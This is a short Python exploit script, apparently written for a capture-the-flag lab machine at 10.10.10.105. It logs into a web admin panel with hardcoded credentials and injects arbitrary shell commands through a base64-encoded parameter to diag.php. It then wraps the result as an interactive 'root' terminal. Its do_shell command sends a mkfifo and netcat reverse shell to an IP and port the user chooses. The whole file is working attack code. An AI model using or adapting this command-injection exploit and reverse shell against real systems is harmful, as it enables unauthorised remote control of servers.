#!/usr/bin/python3

import re
import requests
from base64 import b64encode
from cmd import Cmd

pat = re.compile("<p>aaaaaaaaaaaaaaaa</p><p>(.*)</p><p>bbbbbbbbbbbbbbb", re.DOTALL)


class Terminal(Cmd):

    prompt = "root@r1# "

    
    def __init__(self):
        super().__init__()
        self.s = requests.session()
        self.s.post('http://10.10.10.105/', data={'username': 'admin', 'password': 'NET_45JDX23'})


    def default(self, args):
        try:
            encoded_cmd = b64encode(f'abcd; echo aaaaaaaaaaaaaaaa; {args} 2>&1; echo bbbbbbbbbbbbbbb'.encode())
            r = self.s.post('http://10.10.10.105/diag.php', data={'check': encoded_cmd})
            print(re.search(pat, r.text).group(1).replace("</p><p>", "\n"))
        except AttributeError:
            pass


    def do_shell(self, args):
        ip, port = args.split(' ', 2)[:2]
        self.default(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")


term = Terminal()
term.cmdloop()


